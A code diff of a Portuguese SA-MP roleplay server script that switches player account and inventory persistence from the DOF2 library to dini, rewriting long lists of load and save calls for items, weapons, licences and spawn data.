- 	   	pObjects[playerid][o_19006] = DOF2_GetInt(ficheiro, "o_19006");
- 	   	pObjects[playerid][o_19027] = DOF2_GetInt(ficheiro, "o_19027");
- 	   	pObjects[playerid][o_19160] = DOF2_GetInt(ficheiro, "o_19007");
- 	   	pObjects[playerid][o_18940] = DOF2_GetInt(ficheiro, "o_19008");
- 	   	pObjects[playerid][o_18941] = DOF2_GetInt(ficheiro, "o_19009");
- 	   	pObjects[playerid][o_19011] = DOF2_GetInt(ficheiro, "o_19010");
- 	   	pObjects[playerid][o_19006] = DOF2_GetInt(ficheiro, "o_19011");
- 	   	pObjects[playerid][o_19027] = DOF2_GetInt(ficheiro, "o_19012");
- 	   	pObjects[playerid][o_19160] = DOF2_GetInt(ficheiro, "o_19013");
- 	   	pObjects[playerid][o_18940] = DOF2_GetInt(ficheiro, "o_19014");
- 	   	pObjects[playerid][o_18941] = DOF2_GetInt(ficheiro, "o_19015");
- 	   	pObjects[playerid][o_19011] = DOF2_GetInt(ficheiro, "o_19016");
- 	   	pObjects[playerid][o_19006] = DOF2_GetInt(ficheiro, "o_19017");
- 	   	pObjects[playerid][o_19027] = DOF2_GetInt(ficheiro, "o_19018");
- 	   	pObjects[playerid][Radio] = DOF2_GetInt(ficheiro, "Radio");
- 	   	pObjects[playerid][Arma1Mochila] = DOF2_GetInt(ficheiro, "Arma1Mochila");
- 	   	pObjects[playerid][Ammo1Mochila] = DOF2_GetInt(ficheiro, "Ammo1Mochila");
- 	   	pObjects[playerid][Arma2Mochila] = DOF2_GetInt(ficheiro, "Arma2Mochila");
- 	   	pObjects[playerid][Ammo2Mochila] = DOF2_GetInt(ficheiro, "Ammo2Mochila");
- 	   	pObjects[playerid][Arma3Mochila] = DOF2_GetInt(ficheiro, "Arma3Mochila");
- 	   	pObjects[playerid][Ammo3Mochila] = DOF2_GetInt(ficheiro, "Ammo3Mochila");
- 	   	pObjects[playerid][Arma4Mochila] = DOF2_GetInt(ficheiro, "Arma4Mochila");
- 	   	pObjects[playerid][Ammo4Mochila] = DOF2_GetInt(ficheiro, "Ammo4Mochila");
- 	   	pObjects[playerid][Bidom] = DOF2_GetInt(ficheiro, "Bidom");
- 	   	pObjects[playerid][ListaTel] = DOF2_GetInt(ficheiro, "ListaTel");
- 	   	pObjects[playerid][Mascara] = DOF2_GetInt(ficheiro, "Mascara");
- 	   	pObjects[playerid][Corda] = DOF2_GetInt(ficheiro, "Corda");
- 	   	pObjects[playerid][Venda] = DOF2_GetInt(ficheiro, "Venda");
- 	   	pObjects[playerid][Capacete] = DOF2_GetInt(ficheiro, "Capacete");
- 	   	pObjects[playerid][CanaDePesca] = DOF2_GetInt(ficheiro, "CanaDePesca");
-		pObjects[playerid][WalkieTalkie] = DOF2_GetInt(ficheiro, "WalkieTalkie");
-		pObjects[playerid][WalkieTalkieFreq] = DOF2_GetInt(ficheiro, "WalkieTalkieFreq");
- 	   	pObjects[playerid][Peixe_Corvina] = DOF2_GetInt(ficheiro, "Peixe_Corvina");
- 	   	pObjects[playerid][Peixe_Congro] = DOF2_GetInt(ficheiro, "Peixe_Congro");
-		pObjects[playerid][Peixe_Robalo] = DOF2_GetInt(ficheiro, "Peixe_Robalo");
-		pObjects[playerid][Peixe_Sargo] = DOF2_GetInt(ficheiro, "Peixe_Sargo");
- 	   	pObjects[playerid][Peixe_Goraz] = DOF2_GetInt(ficheiro, "Peixe_Goraz");
- 	   	pObjects[playerid][Peixe_Cavala] = DOF2_GetInt(ficheiro, "Peixe_Cavala");
-		pObjects[playerid][Peixe_Dourada] = DOF2_GetInt(ficheiro, "Peixe_Dourada");
-		pObjects[playerid][Peixe_Espada] = DOF2_GetInt(ficheiro, "Peixe_Espada");
-		pObjects[playerid][Isco] = DOF2_GetInt(ficheiro, "Isco");
+
+ 	   	pObjects[playerid][Mala] = dini_Int(ficheiro, "Mala");
+ 	   	pObjects[playerid][Mochila] = dini_Int(ficheiro, "Mochila");
+ 	   	pObjects[playerid][Arma1Mala] = dini_Int(ficheiro, "Arma1Mala");
+ 	   	pObjects[playerid][Ammo1Mala] = dini_Int(ficheiro, "Ammo1Mala");
+ 	   	pObjects[playerid][Arma2Mala] = dini_Int(ficheiro, "Arma2Mala");
+ 	   	pObjects[playerid][Ammo2Mala] = dini_Int(ficheiro, "Ammo2Mala");
+ 	   	pObjects[playerid][Arma3Mala] = dini_Int(ficheiro, "Arma3Mala");
+ 	   	pObjects[playerid][Ammo3Mala] = dini_Int(ficheiro, "Ammo3Mala");
+ 	   	pObjects[playerid][Arma4Mala] = dini_Int(ficheiro, "Arma4Mala");
+ 	   	pObjects[playerid][Ammo4Mala] = dini_Int(ficheiro, "Ammo4Mala");
+ 	   	pObjects[playerid][Telemovel] = dini_Int(ficheiro, "Telemovel");
+ 	   	pObjects[playerid][o_2054] = dini_Int(ficheiro, "o_2054");
+ 	   	pObjects[playerid][o_18639] = dini_Int(ficheiro, "o_18639");
+ 	   	pObjects[playerid][o_18943] = dini_Int(ficheiro, "o_18943");
+ 	   	pObjects[playerid][o_2053] = dini_Int(ficheiro, "o_2053");
+ 	   	pObjects[playerid][o_2052] = dini_Int(ficheiro, "o_2052");
+ 	   	pObjects[playerid][o_19160] = dini_Int(ficheiro, "o_19160");
+ 	   	pObjects[playerid][o_18940] = dini_Int(ficheiro, "o_18940");
+ 	   	pObjects[playerid][o_18941] = dini_Int(ficheiro, "o_18941");
+ 	   	pObjects[playerid][o_19011] = dini_Int(ficheiro, "o_19011");
+ 	   	pObjects[playerid][o_19006] = dini_Int(ficheiro, "o_19006");
+ 	   	pObjects[playerid][o_19027] = dini_Int(ficheiro, "o_19027");
+ 	   	pObjects[playerid][o_19160] = dini_Int(ficheiro, "o_19007");
+ 	   	pObjects[playerid][o_18940] = dini_Int(ficheiro, "o_19008");
+ 	   	pObjects[playerid][o_18941] = dini_Int(ficheiro, "o_19009");
+ 	   	pObjects[playerid][o_19011] = dini_Int(ficheiro, "o_19010");
+ 	   	pObjects[playerid][o_19006] = dini_Int(ficheiro, "o_19011");
+ 	   	pObjects[playerid][o_19027] = dini_Int(ficheiro, "o_19012");
+ 	   	pObjects[playerid][o_19160] = dini_Int(ficheiro, "o_19013");
+ 	   	pObjects[playerid][o_18940] = dini_Int(ficheiro, "o_19014");
+ 	   	pObjects[playerid][o_18941] = dini_Int(ficheiro, "o_19015");
+ 	   	pObjects[playerid][o_19011] = dini_Int(ficheiro, "o_19016");
+ 	   	pObjects[playerid][o_19006] = dini_Int(ficheiro, "o_19017");
+ 	   	pObjects[playerid][o_19027] = dini_Int(ficheiro, "o_19018");
+ 	   	pObjects[playerid][Radio] = dini_Int(ficheiro, "Radio");
+ 	   	pObjects[playerid][Arma1Mochila] = dini_Int(ficheiro, "Arma1Mochila");
+ 	   	pObjects[playerid][Ammo1Mochila] = dini_Int(ficheiro, "Ammo1Mochila");
+ 	   	pObjects[playerid][Arma2Mochila] = dini_Int(ficheiro, "Arma2Mochila");
+ 	   	pObjects[playerid][Ammo2Mochila] = dini_Int(ficheiro, "Ammo2Mochila");
+ 	   	pObjects[playerid][Arma3Mochila] = dini_Int(ficheiro, "Arma3Mochila");
+ 	   	pObjects[playerid][Ammo3Mochila] = dini_Int(ficheiro, "Ammo3Mochila");
+ 	   	pObjects[playerid][Arma4Mochila] = dini_Int(ficheiro, "Arma4Mochila");
+ 	   	pObjects[playerid][Ammo4Mochila] = dini_Int(ficheiro, "Ammo4Mochila");
+ 	   	pObjects[playerid][Bidom] = dini_Int(ficheiro, "Bidom");
+ 	   	pObjects[playerid][ListaTel] = dini_Int(ficheiro, "ListaTel");
+ 	   	pObjects[playerid][Mascara] = dini_Int(ficheiro, "Mascara");
+ 	   	pObjects[playerid][Corda] = dini_Int(ficheiro, "Corda");
+ 	   	pObjects[playerid][Venda] = dini_Int(ficheiro, "Venda");
+ 	   	pObjects[playerid][Capacete] = dini_Int(ficheiro, "Capacete");
+ 	   	pObjects[playerid][CanaDePesca] = dini_Int(ficheiro, "CanaDePesca");
+		pObjects[playerid][WalkieTalkie] = dini_Int(ficheiro, "WalkieTalkie");
+		pObjects[playerid][WalkieTalkieFreq] = dini_Int(ficheiro, "WalkieTalkieFreq");
+ 	   	pObjects[playerid][Peixe_Corvina] = dini_Int(ficheiro, "Peixe_Corvina");
+ 	   	pObjects[playerid][Peixe_Congro] = dini_Int(ficheiro, "Peixe_Congro");
+		pObjects[playerid][Peixe_Robalo] = dini_Int(ficheiro, "Peixe_Robalo");
+		pObjects[playerid][Peixe_Sargo] = dini_Int(ficheiro, "Peixe_Sargo");
+ 	   	pObjects[playerid][Peixe_Goraz] = dini_Int(ficheiro, "Peixe_Goraz");
+ 	   	pObjects[playerid][Peixe_Cavala] = dini_Int(ficheiro, "Peixe_Cavala");
+		pObjects[playerid][Peixe_Dourada] = dini_Int(ficheiro, "Peixe_Dourada");
+		pObjects[playerid][Peixe_Espada] = dini_Int(ficheiro, "Peixe_Espada");
+		pObjects[playerid][Isco] = dini_Int(ficheiro, "Isco");
 
  	   	if(pInfo[playerid][Banido] == 1) return KickPlayer(playerid, "Doge", "Tens a conta banida");
- 	   	
+
  	   	Logged[playerid] = true;
  	   	SpawnarJogador(playerid);
     }
@@ -11163,14 +11174,14 @@ public LogarJogador(playerid, password[])
     {
    		new sdialog[512];
 		new string[128];
-		
+
 		BadLoginCounter[playerid]++;
-    	
+
     	format(string, sizeof(string), "{FF9900}[ {FFFFFF}PORTUGAL FUN MAPS {FF9900}]"); strcat(sdialog,string);
     	format(string, sizeof(string), "\n\n{FFFFFF}Nome da tua conta: {FF9900}%s", GetPlayerNameEx(playerid)); strcat(sdialog,string);
     	format(string, sizeof(string), "\n{FFFFFF}Status: {FF9900}Registada"); strcat(sdialog,string);
     	format(string, sizeof(string), "\n{FFFFFF}Tentativas: {AA3333}%d{FF9900}/3", BadLoginCounter[playerid]); strcat(sdialog,string);
-    	
+
         ShowPlayerDialog(playerid, DIALOG_LOGIN, DIALOG_STYLE_PASSWORD, "LOGIN", sdialog, "Login", "Sair");
     }
 	return 1;
@@ -11178,231 +11189,249 @@ public LogarJogador(playerid, password[])
 
 public GuardarJogador(playerid)
 {
-	if(Logged[playerid] == false) return 1;
-	
+	if(Logged[playerid] == false && pInfo[playerid][TutFeito] == 1) return 1;
+
 	new ficheiro[64];
 
 	new name[MAX_PLAYER_NAME];
     GetPlayerName(playerid, name, sizeof(name));
-    
-	new Float:health, Float:armour;
-	GetPlayerHealth(playerid, health);
-	GetPlayerArmour(playerid, armour);
-	
+
     format(ficheiro, sizeof(ficheiro), "PCRP/Contas/%s.ini", name);
-    
-    DOF2_SetInt(ficheiro, "Banido", pInfo[playerid][Banido]);
-    DOF2_SetInt(ficheiro, "UID", pInfo[playerid][UID]);
-    DOF2_SetFloat(ficheiro, "Vida", health);
-    DOF2_SetInt(ficheiro, "Level", pInfo[playerid][Level]);
-    DOF2_SetInt(ficheiro, "Skin", pInfo[playerid][Skin]);
-    DOF2_SetInt(ficheiro, "Admin", pInfo[playerid][Admin]);
-    DOF2_SetInt(ficheiro, "Emprego", pInfo[playerid][Emprego]);
-    DOF2_SetInt(ficheiro, "Faction", pInfo[playerid][Faction]);
-    DOF2_SetInt(ficheiro, "FactionRank", pInfo[playerid][FactionRank]);
-    DOF2_SetInt(ficheiro, "AJCounter", pInfo[playerid][AJCounter]);
-    DOF2_SetInt(ficheiro, "Origem", pInfo[playerid][Origem]);
-    DOF2_SetInt(ficheiro, "Sexo", pInfo[playerid][Sexo]);
-    DOF2_SetInt(ficheiro, "Idade", pInfo[playerid][Idade]);
-    DOF2_SetInt(ficheiro, "Registado", pInfo[playerid][Registado]);
-    DOF2_SetInt(ficheiro, "TutFeito", pInfo[playerid][TutFeito]);
-    DOF2_SetInt(ficheiro, "Money", GetPlayerMoneyEx(playerid));
-    DOF2_SetInt(ficheiro, "Bank", pInfo[playerid][Bank]);
-    DOF2_SetInt(ficheiro, "ChaveBiz", pInfo[playerid][ChaveBiz]);
-    DOF2_SetInt(ficheiro, "ChaveCasa", pInfo[playerid][ChaveCasa]);
-    DOF2_SetInt(ficheiro, "ChaveCasaAlugada", pInfo[playerid][ChaveCasa]);
-    DOF2_SetInt(ficheiro, "ChaveCarro1", pInfo[playerid][ChaveCarro1]);
-    DOF2_SetInt(ficheiro, "ChaveCarro2", pInfo[playerid][ChaveCarro2]);
-    DOF2_SetInt(ficheiro, "ChaveCarro3", pInfo[playerid][ChaveCarro3]);
-    DOF2_SetInt(ficheiro, "ChaveCarro4", pInfo[playerid][ChaveCarro4]);
-    DOF2_SetInt(ficheiro, "ChaveCarroEmp1", pInfo[playerid][ChaveCarroEmp1]);
-    DOF2_SetInt(ficheiro, "ChaveCarroEmp2", pInfo[playerid][ChaveCarroEmp2]);
-    DOF2_SetInt(ficheiro, "ChaveCarroEmp3", pInfo[playerid][ChaveCarroEmp3]);
-    DOF2_SetInt(ficheiro, "ChaveCarroEmp4", pInfo[playerid][ChaveCarroEmp4]);
-    DOF2_SetInt(ficheiro, "Minutos", pInfo[playerid][Minutos]);
-    DOF2_SetInt(ficheiro, "PreDrogas", pInfo[playerid][PreDrogas]);
-    DOF2_SetInt(ficheiro, "PreMateriais", pInfo[playerid][PreMateriais]);
-    DOF2_SetInt(ficheiro, "Drogas", pInfo[playerid][Drogas]);
-    DOF2_SetInt(ficheiro, "Materiais", pInfo[playerid][Materiais]);
-    DOF2_SetInt(ficheiro, "CartaLig", pInfo[playerid][CartaLig]);
-    DOF2_SetInt(ficheiro, "CartaMota", pInfo[playerid][CartaMota]);
-    DOF2_SetInt(ficheiro, "CartaPesados", pInfo[playerid][CartaPesados]);
-    DOF2_SetInt(ficheiro, "CartaBarco", pInfo[playerid][CartaBarco]);
-    DOF2_SetInt(ficheiro, "LicArmas", pInfo[playerid][LicArmas]);
-    DOF2_SetInt(ficheiro, "Multas", pInfo[playerid][Multas]);
-    DOF2_SetInt(ficheiro, "Jailed", pInfo[playerid][Jailed]);
-    DOF2_SetInt(ficheiro, "JailTime", pInfo[playerid][JailTime]);
-    DOF2_SetInt(ficheiro, "Preso", pInfo[playerid][Preso]);
-    DOF2_SetInt(ficheiro, "PresoTempo", pInfo[playerid][PresoTempo]);
-    DOF2_SetInt(ficheiro, "XP", pInfo[playerid][XP]);
-    DOF2_SetInt(ficheiro, "Meses", pInfo[playerid][Meses]);
-    DOF2_SetInt(ficheiro, "Doenca", pInfo[playerid][Doenca]);
-    DOF2_SetInt(ficheiro, "Medicamentos", pInfo[playerid][Medicamentos]);
-    DOF2_SetInt(ficheiro, "MedicamentosTomados", pInfo[playerid][MedicamentosTomados]);
-    DOF2_SetInt(ficheiro, "ReceitaMedica", pInfo[playerid][ReceitaMedica]);
-    DOF2_SetInt(ficheiro, "Euro1", pInfo[playerid][Euro1]);
-    DOF2_SetInt(ficheiro, "Euro2", pInfo[playerid][Euro2]);
-    DOF2_SetInt(ficheiro, "Euro3", pInfo[playerid][Euro3]);
-    DOF2_SetInt(ficheiro, "Euro4", pInfo[playerid][Euro4]);
-    DOF2_SetInt(ficheiro, "Euro5", pInfo[playerid][Euro5]);
-    DOF2_SetInt(ficheiro, "BilheteEuro", pInfo[playerid][BilheteEuro]);
-    DOF2_SetInt(ficheiro, "Estrela1", pInfo[playerid][Estrela1]);
-    DOF2_SetInt(ficheiro, "Codigo", pInfo[playerid][Codigo]);
-    DOF2_SetInt(ficheiro, "Rotas", pInfo[playerid][Rotas]);
-    DOF2_SetInt(ficheiro, "EmpregoNivel", pInfo[playerid][EmpregoNivel]);
-    DOF2_SetInt(ficheiro, "TempoRota", pInfo[playerid][TempoRota]);
-    DOF2_SetInt(ficheiro, "CC", pInfo[playerid][CC]);
-    DOF2_SetInt(ficheiro, "Seguradora", pInfo[playerid][Seguradora]);
-    DOF2_SetInt(ficheiro, "MensalidadeSeguradora", pInfo[playerid][MensalidadeSeguradora]);
-    DOF2_SetInt(ficheiro, "SeguradoraCount", pInfo[playerid][SeguradoraCount]);
-    DOF2_SetInt(ficheiro, "SeguradoraPayCount", pInfo[playerid][SeguradoraPayCount]);
-    DOF2_SetInt(ficheiro, "Golds", pInfo[playerid][Golds]);
-    DOF2_SetInt(ficheiro, "Viciado", pInfo[playerid][Viciado]);
-    DOF2_SetInt(ficheiro, "TempoViciado", pInfo[playerid][TempoViciado]);
-    DOF2_SetInt(ficheiro, "ADesentoxicar", pInfo[playerid][ADesentoxicar]);
-    DOF2_SetInt(ficheiro, "NumeroTelemovel", pInfo[playerid][NumeroTelemovel]);
-    DOF2_SetInt(ficheiro, "Rede", pInfo[playerid][Rede]);
-    DOF2_SetInt(ficheiro, "Saldo", pInfo[playerid][Saldo]);
-    DOF2_SetInt(ficheiro, "TutFalhado", pInfo[playerid][TutFalhado]);
-    DOF2_SetInt(ficheiro, "LicPesca", pInfo[playerid][LicPesca]);
-    DOF2_SetFloat(ficheiro, "Colete", armour);
-	DOF2_SetFloat(ficheiro, "MorteX", pInfo[playerid][MorteX]);
-	DOF2_SetFloat(ficheiro, "MorteY", pInfo[playerid][MorteY]);
-	DOF2_SetFloat(ficheiro, "MorteZ", pInfo[playerid][MorteZ]);
-	DOF2_SetInt(ficheiro, "MorteVirtualWorld", pInfo[playerid][MorteVirtualWorld]);
-	DOF2_SetInt(ficheiro, "MorteInterior", pInfo[playerid][MorteInterior]);
-	DOF2_SetFloat(ficheiro, "SpawnX", pInfo[playerid][SpawnX]);
-	DOF2_SetFloat(ficheiro, "SpawnY", pInfo[playerid][SpawnY]);
-	DOF2_SetFloat(ficheiro, "SpawnZ", pInfo[playerid][SpawnZ]);
-	DOF2_SetInt(ficheiro, "SpawnVirtualWorld", pInfo[playerid][SpawnVirtualWorld]);
-	DOF2_SetInt(ficheiro, "SpawnInterior", pInfo[playerid][SpawnInterior]);
-	DOF2_SetInt(ficheiro, "Suspeito", pInfo[playerid][Suspeito]);
-	DOF2_SetInt(ficheiro, "VezesSuspeito", pInfo[playerid][VezesSuspeito]);
-	DOF2_SetInt(ficheiro, "VezesPreso", pInfo[playerid][VezesPreso]);
-	
 
-    DOF2_SaveFile();
-    
+    dini_IntSet(ficheiro, "Banido", pInfo[playerid][Banido]);
+    dini_IntSet(ficheiro, "UID", pInfo[playerid][UID]);
+    dini_FloatSet(ficheiro, "Vida", pInfo[playerid][Vida]);
+    dini_IntSet(ficheiro, "Level", pInfo[playerid][Level]);
+    dini_IntSet(ficheiro, "Skin", pInfo[playerid][Skin]);
+    dini_IntSet(ficheiro, "Admin", pInfo[playerid][Admin]);
+    dini_IntSet(ficheiro, "Emprego", pInfo[playerid][Emprego]);
+    dini_IntSet(ficheiro, "Faction", pInfo[playerid][Faction]);
+    dini_IntSet(ficheiro, "FactionRank", pInfo[playerid][FactionRank]);
+    dini_IntSet(ficheiro, "AJCounter", pInfo[playerid][AJCounter]);
+    dini_IntSet(ficheiro, "Origem", pInfo[playerid][Origem]);
+    dini_IntSet(ficheiro, "Sexo", pInfo[playerid][Sexo]);
+    dini_IntSet(ficheiro, "Idade", pInfo[playerid][Idade]);
+    dini_IntSet(ficheiro, "Registado", pInfo[playerid][Registado]);
+    dini_IntSet(ficheiro, "TutFeito", pInfo[playerid][TutFeito]);
+    dini_IntSet(ficheiro, "Money", GetPlayerMoneyEx(playerid));
+    dini_IntSet(ficheiro, "Bank", pInfo[playerid][Bank]);
+    dini_IntSet(ficheiro, "ChaveBiz", pInfo[playerid][ChaveBiz]);
+    dini_IntSet(ficheiro, "ChaveCasa", pInfo[playerid][ChaveCasa]);
+    dini_IntSet(ficheiro, "ChaveCasaAlugada", pInfo[playerid][ChaveCasa]);
+    dini_IntSet(ficheiro, "ChaveCarro1", pInfo[playerid][ChaveCarro1]);
+    dini_IntSet(ficheiro, "ChaveCarro2", pInfo[playerid][ChaveCarro2]);
+    dini_IntSet(ficheiro, "ChaveCarro3", pInfo[playerid][ChaveCarro3]);
+    dini_IntSet(ficheiro, "ChaveCarro4", pInfo[playerid][ChaveCarro4]);
+    dini_IntSet(ficheiro, "ChaveCarroEmp1", pInfo[playerid][ChaveCarroEmp1]);
+    dini_IntSet(ficheiro, "ChaveCarroEmp2", pInfo[playerid][ChaveCarroEmp2]);
+    dini_IntSet(ficheiro, "ChaveCarroEmp3", pInfo[playerid][ChaveCarroEmp3]);
+    dini_IntSet(ficheiro, "ChaveCarroEmp4", pInfo[playerid][ChaveCarroEmp4]);
+    dini_IntSet(ficheiro, "Minutos", pInfo[playerid][Minutos]);
+    dini_IntSet(ficheiro, "PreDrogas", pInfo[playerid][PreDrogas]);
+    dini_IntSet(ficheiro, "PreMateriais", pInfo[playerid][PreMateriais]);
+    dini_IntSet(ficheiro, "Drogas", pInfo[playerid][Drogas]);
+    dini_IntSet(ficheiro, "Materiais", pInfo[playerid][Materiais]);
+    dini_IntSet(ficheiro, "CartaLig", pInfo[playerid][CartaLig]);
+    dini_IntSet(ficheiro, "CartaMota", pInfo[playerid][CartaMota]);
+    dini_IntSet(ficheiro, "CartaPesados", pInfo[playerid][CartaPesados]);
+    dini_IntSet(ficheiro, "CartaBarco", pInfo[playerid][CartaBarco]);
+    dini_IntSet(ficheiro, "LicArmas", pInfo[playerid][LicArmas]);
+    dini_IntSet(ficheiro, "Multas", pInfo[playerid][Multas]);
+    dini_IntSet(ficheiro, "Jailed", pInfo[playerid][Jailed]);
+    dini_IntSet(ficheiro, "JailTime", pInfo[playerid][JailTime]);
+    dini_IntSet(ficheiro, "Preso", pInfo[playerid][Preso]);
+    dini_IntSet(ficheiro, "PresoTempo", pInfo[playerid][PresoTempo]);
+    dini_IntSet(ficheiro, "XP", pInfo[playerid][XP]);
+    dini_IntSet(ficheiro, "Meses", pInfo[playerid][Meses]);
+    dini_IntSet(ficheiro, "Doenca", pInfo[playerid][Doenca]);
+    dini_IntSet(ficheiro, "Medicamentos", pInfo[playerid][Medicamentos]);
+    dini_IntSet(ficheiro, "MedicamentosTomados", pInfo[playerid][MedicamentosTomados]);
+    dini_IntSet(ficheiro, "ReceitaMedica", pInfo[playerid][ReceitaMedica]);
+    dini_IntSet(ficheiro, "Euro1", pInfo[playerid][Euro1]);
+    dini_IntSet(ficheiro, "Euro2", pInfo[playerid][Euro2]);
+    dini_IntSet(ficheiro, "Euro3", pInfo[playerid][Euro3]);
+    dini_IntSet(ficheiro, "Euro4", pInfo[playerid][Euro4]);
+    dini_IntSet(ficheiro, "Euro5", pInfo[playerid][Euro5]);
+    dini_IntSet(ficheiro, "BilheteEuro", pInfo[playerid][BilheteEuro]);
+    dini_IntSet(ficheiro, "Estrela1", pInfo[playerid][Estrela1]);
+    dini_IntSet(ficheiro, "Codigo", pInfo[playerid][Codigo]);
+    dini_IntSet(ficheiro, "Rotas", pInfo[playerid][Rotas]);
+    dini_IntSet(ficheiro, "EmpregoNivel", pInfo[playerid][EmpregoNivel]);
+    dini_IntSet(ficheiro, "TempoRota", pInfo[playerid][TempoRota]);
+    dini_IntSet(ficheiro, "CC", pInfo[playerid][CC]);
+    dini_IntSet(ficheiro, "Seguradora", pInfo[playerid][Seguradora]);
+    dini_IntSet(ficheiro, "MensalidadeSeguradora", pInfo[playerid][MensalidadeSeguradora]);
+    dini_IntSet(ficheiro, "SeguradoraCount", pInfo[playerid][SeguradoraCount]);
+    dini_IntSet(ficheiro, "SeguradoraPayCount", pInfo[playerid][SeguradoraPayCount]);
+    dini_IntSet(ficheiro, "Golds", pInfo[playerid][Golds]);
+    dini_IntSet(ficheiro, "Viciado", pInfo[playerid][Viciado]);
+    dini_IntSet(ficheiro, "TempoViciado", pInfo[playerid][TempoViciado]);
+    dini_IntSet(ficheiro, "ADesentoxicar", pInfo[playerid][ADesentoxicar]);
+    dini_IntSet(ficheiro, "NumeroTelemovel", pInfo[playerid][NumeroTelemovel]);
+    dini_IntSet(ficheiro, "Rede", pInfo[playerid][Rede]);
+    dini_IntSet(ficheiro, "Saldo", pInfo[playerid][Saldo]);
+    dini_IntSet(ficheiro, "TutFalhado", pInfo[playerid][TutFalhado]);
+    dini_IntSet(ficheiro, "LicPesca", pInfo[playerid][LicPesca]);
+    dini_FloatSet(ficheiro, "Colete", pInfo[playerid][Colete]);
+	dini_FloatSet(ficheiro, "MorteX", pInfo[playerid][MorteX]);
+	dini_FloatSet(ficheiro, "MorteY", pInfo[playerid][MorteY]);
+	dini_FloatSet(ficheiro, "MorteZ", pInfo[playerid][MorteZ]);
+	dini_IntSet(ficheiro, "MorteVirtualWorld", pInfo[playerid][MorteVirtualWorld]);
+	dini_IntSet(ficheiro, "MorteInterior", pInfo[playerid][MorteInterior]);
+	dini_FloatSet(ficheiro, "SpawnX", pInfo[playerid][SpawnX]);
+	dini_FloatSet(ficheiro, "SpawnY", pInfo[playerid][SpawnY]);
+	dini_FloatSet(ficheiro, "SpawnZ", pInfo[playerid][SpawnZ]);
+	dini_IntSet(ficheiro, "SpawnVirtualWorld", pInfo[playerid][SpawnVirtualWorld]);
+	dini_IntSet(ficheiro, "SpawnInterior", pInfo[playerid][SpawnInterior]);
+	dini_IntSet(ficheiro, "Crashou", pInfo[playerid][Crashou]);
+	dini_IntSet(ficheiro, "Suspeito", pInfo[playerid][Suspeito]);
+	dini_IntSet(ficheiro, "VezesSuspeito", pInfo[playerid][VezesSuspeito]);
+	dini_IntSet(ficheiro, "VezesPreso", pInfo[playerid][VezesPreso]);
+	dini_IntSet(ficheiro, "Kicks", pInfo[playerid][Kicks]);
+
     format(ficheiro, sizeof(ficheiro), "PCRP/Objetos/%s.ini", name);
-    
-    DOF2_SetInt(ficheiro, "Mala", pObjects[playerid][Mala]);
-    DOF2_SetInt(ficheiro, "Mochila", pObjects[playerid][Mochila]);
-    DOF2_SetInt(ficheiro, "Arma1Mala", pObjects[playerid][Arma1Mala]);
-    DOF2_SetInt(ficheiro, "Ammo1Mala", pObjects[playerid][Ammo1Mala]);
-    DOF2_SetInt(ficheiro, "Arma2Mala", pObjects[playerid][Arma2Mala]);
-    DOF2_SetInt(ficheiro, "Ammo2Mala", pObjects[playerid][Ammo2Mala]);
-    DOF2_SetInt(ficheiro, "Arma3Mala", pObjects[playerid][Arma3Mala]);
-    DOF2_SetInt(ficheiro, "Ammo3Mala", pObjects[playerid][Ammo3Mala]);
-    DOF2_SetInt(ficheiro, "Arma4Mala", pObjects[playerid][Arma4Mala]);
-    DOF2_SetInt(ficheiro, "Ammo4Mala", pObjects[playerid][Ammo4Mala]);
-    DOF2_SetInt(ficheiro, "Telemovel", pObjects[playerid][Telemovel]);
-    DOF2_SetInt(ficheiro, "o_2054", pObjects[playerid][o_2054]);
-    DOF2_SetInt(ficheiro, "o_18639", pObjects[playerid][o_18639]);
-    DOF2_SetInt(ficheiro, "o_18943", pObjects[playerid][o_18943]);
-    DOF2_SetInt(ficheiro, "o_2053", pObjects[playerid][o_2053]);
-    DOF2_SetInt(ficheiro, "o_2052", pObjects[playerid][o_2052]);
-    DOF2_SetInt(ficheiro, "o_19160", pObjects[playerid][o_19160]);
-    DOF2_SetInt(ficheiro, "o_18940", pObjects[playerid][o_18940]);
-    DOF2_SetInt(ficheiro, "o_18941", pObjects[playerid][o_18941]);
-    DOF2_SetInt(ficheiro, "o_19011", pObjects[playerid][o_19011]);
-    DOF2_SetInt(ficheiro, "o_19006", pObjects[playerid][o_19006]);
-    DOF2_SetInt(ficheiro, "o_19027", pObjects[playerid][o_19027]);
-    DOF2_SetInt(ficheiro, "o_19007", pObjects[playerid][o_19007]);
-    DOF2_SetInt(ficheiro, "o_19008", pObjects[playerid][o_19008]);
-    DOF2_SetInt(ficheiro, "o_19009", pObjects[playerid][o_19009]);
-    DOF2_SetInt(ficheiro, "o_19010", pObjects[playerid][o_19010]);
-    DOF2_SetInt(ficheiro, "o_19010", pObjects[playerid][o_19010]);
-    DOF2_SetInt(ficheiro, "o_19011", pObjects[playerid][o_19011]);
-    DOF2_SetInt(ficheiro, "o_19012", pObjects[playerid][o_19012]);
-    DOF2_SetInt(ficheiro, "o_19013", pObjects[playerid][o_19013]);
-    DOF2_SetInt(ficheiro, "o_19014", pObjects[playerid][o_19014]);
-    DOF2_SetInt(ficheiro, "o_19015", pObjects[playerid][o_19015]);
-    DOF2_SetInt(ficheiro, "o_19016", pObjects[playerid][o_19016]);
-    DOF2_SetInt(ficheiro, "o_19017", pObjects[playerid][o_19017]);
-    DOF2_SetInt(ficheiro, "o_19018", pObjects[playerid][o_19018]);
-    DOF2_SetInt(ficheiro, "Radio", pObjects[playerid][Radio]);
-    DOF2_SetInt(ficheiro, "Arma1Mochila", pObjects[playerid][Arma1Mochila]);
-    DOF2_SetInt(ficheiro, "Ammo1Mochila", pObjects[playerid][Ammo1Mochila]);
-    DOF2_SetInt(ficheiro, "Arma2Mochila", pObjects[playerid][Arma2Mochila]);
-    DOF2_SetInt(ficheiro, "Ammo2Mochila", pObjects[playerid][Ammo2Mochila]);
-    DOF2_SetInt(ficheiro, "Arma3Mochila", pObjects[playerid][Arma3Mochila]);
-    DOF2_SetInt(ficheiro, "Ammo3Mochila", pObjects[playerid][Ammo3Mochila]);
-    DOF2_SetInt(ficheiro, "Arma4Mochila", pObjects[playerid][Arma4Mochila]);
-    DOF2_SetInt(ficheiro, "Ammo4Mochila", pObjects[playerid][Ammo4Mochila]);
-    DOF2_SetInt(ficheiro, "Bidom", pObjects[playerid][Bidom]);
-    DOF2_SetInt(ficheiro, "ListaTel", pObjects[playerid][ListaTel]);
-    DOF2_SetInt(ficheiro, "Mascara", pObjects[playerid][Mascara]);
-    DOF2_SetInt(ficheiro, "Corda", pObjects[playerid][Corda]);
-    DOF2_SetInt(ficheiro, "Venda", pObjects[playerid][Venda]);
